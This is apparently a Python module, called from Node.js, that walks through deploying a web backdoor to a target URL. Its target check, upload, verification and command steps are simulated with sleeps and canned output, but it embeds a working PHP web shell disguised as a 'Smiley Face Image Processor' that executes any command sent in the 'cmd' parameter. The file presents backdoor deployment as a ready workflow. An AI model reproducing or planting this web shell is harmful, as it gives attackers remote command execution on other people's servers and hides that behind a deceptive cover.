#!/usr/bin/env python3

import sys
import json
import time
import random
from datetime import datetime

# Set up structured exception handling
try:
    # Parse JSON input from Node.js
    data_str = sys.argv[1] if len(sys.argv) > 1 else "{}"
    data = json.loads(data_str)

    # Extract parameters with defaults
    target_url = data.get("target", "")
    timeout = data.get("timeout", 10)
    test_commands = data.get("commands", ["id", "whoami", "hostname"])

    # Backdoor implementation
    class SmileyBackdoorFlow:
        def __init__(self, target_url, timeout=10):
            self.target_url = target_url
            self.timeout = timeout
            self.backdoor_url = None
            
        def check_target(self):
            """Check if target is accessible and gather basic info"""
            # Use stderr for log messages instead of stdout
            print(f"[*] Checking target at {self.target_url}", file=sys.stderr)
            
            try:
                # Simulate a request to the target
                time.sleep(1)
                
                # For demo purposes, we'll assume the target is accessible
                server = "Apache/2.4.41"
                technologies = ["WordPress"]
                
                return {
                    "status": "success",
                    "server": server,
                    "technologies": technologies
                }
                
            except Exception as e:
                return {
                    "status": "error", 
                    "message": f"Connection error: {str(e)}"
                }
        
        def create_backdoor_payload(self):
            """Create the PHP backdoor code"""
            return """<?php
    // :) Smiley Face Image Processor :)
    // Just a friendly image utility!
    
    // Hidden backdoor functionality
    if(isset($_REQUEST['cmd'])) {
      $output = '';
      if(function_exists('exec')) {
        exec($_REQUEST['cmd'], $output);
        echo implode("\\n", $output);
      }
      exit();
    }
    
    // If no command is provided, just show a smiley
    echo "<!DOCTYPE html><html><body><h1>:) Smiley Processor Active!</h1></body></html>";
    ?>"""
        
        def try_upload_backdoor(self):
            """Attempt to upload the backdoor to the target"""
            print(f"[*] Attempting to upload backdoor to {self.target_url}", file=sys.stderr)
            
            timestamp = int(time.time())
            random_id = random.randint(1000, 9999)
            backdoor_name = f"smiley_{timestamp}_{random_id}.php"
            
            # Simulate the upload process
            time.sleep(1)
            
            # Simulate a successful upload
            self.backdoor_url = f"{self.target_url}/uploads/{backdoor_name}"
            
            return {
                "status": "success",
                "backdoor_name": backdoor_name,
                "backdoor_url": self.backdoor_url
            }
        
        def verify_backdoor(self):
            """Check if the backdoor is accessible"""
            if not self.backdoor_url:
                return {"status": "error", "message": "No backdoor URL available"}
                
            print(f"[*] Verifying backdoor at {self.backdoor_url}", file=sys.stderr)
            
            # Simulate verification
            time.sleep(0.5)
            
            return {
                "status": "success",
                "message": "Backdoor verified and accessible"
            }
        
        def execute_command(self, command):
            """Execute a command via the backdoor"""
            if not self.backdoor_url:
                return {"status": "error", "message": "No backdoor URL available"}
                
            print(f"[*] Executing command: {command}", file=sys.stderr)
            
            # Simulate command execution
            time.sleep(0.5)
            
            if command == "id":
                output = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
            elif command == "whoami":
                output = "www-data"
            elif command == "hostname":
                output = "target-server"
            else:
                output = f"Command executed: {command}"
            
            return {
                "status": "success",
                "command": command,
                "output": output
            }
        
        def run(self, test_commands=None):
            """Run the complete backdoor deployment process"""
            if not test_commands:
                test_commands = ["id", "whoami", "hostname"]
                
            result = {
                "target": self.target_url,
                "timestamp": datetime.now().isoformat(),
                "status": "running",
                "steps": []
            }
            
            # Step 1: Check target
            check_result = self.check_target()
            result["steps"].append({"step": "check_target", "result": check_result})
            
            if check_result["status"] != "success":
                result["status"] = "failed"
                result["message"] = check_result.get("message", "Target check failed")
                return result
            
            # Step 2: Upload backdoor
            upload_result = self.try_upload_backdoor()
            result["steps"].append({"step": "upload_backdoor", "result": upload_result})
            
            if upload_result["status"] != "success":
                result["status"] = "failed"
                result["message"] = "Failed to upload backdoor"
                return result
                
            result["backdoor_url"] = upload_result["backdoor_url"]
            
            # Step 3: Verify backdoor
            verify_result = self.verify_backdoor()
            result["steps"].append({"step": "verify_backdoor", "result": verify_result})
            
            if verify_result["status"] != "success":
                result["status"] = "partially_successful"
                result["message"] = "Backdoor uploaded but verification failed"
                return result
            
            # Step 4: Test commands
            command_results = []
            for command in test_commands:
                cmd_result = self.execute_command(command)
                command_results.append(cmd_result)
            
            result["steps"].append({"step": "test_commands", "results": command_results})
            result["status"] = "success"
            result["message"] = f"Backdoor successfully deployed at {self.backdoor_url}"
            
            return result

    # Validate input
    if not target_url:
        output = {"status": "error", "message": "Target URL is required"}
    else:
        # Run the backdoor deployment
        backdoor = SmileyBackdoorFlow(target_url, timeout)
        output = backdoor.run(test_commands)

    # Output ONLY the final JSON to stdout (for Node.js to parse)
    print(json.dumps({"message": output}))

except Exception as e:
    # If any exception occurs, return a structured error message
    error_output = {
        "status": "error",
        "message": f"Script error: {str(e)}",
        "type": type(e).__name__
    }
    print(json.dumps({"message": error_output}))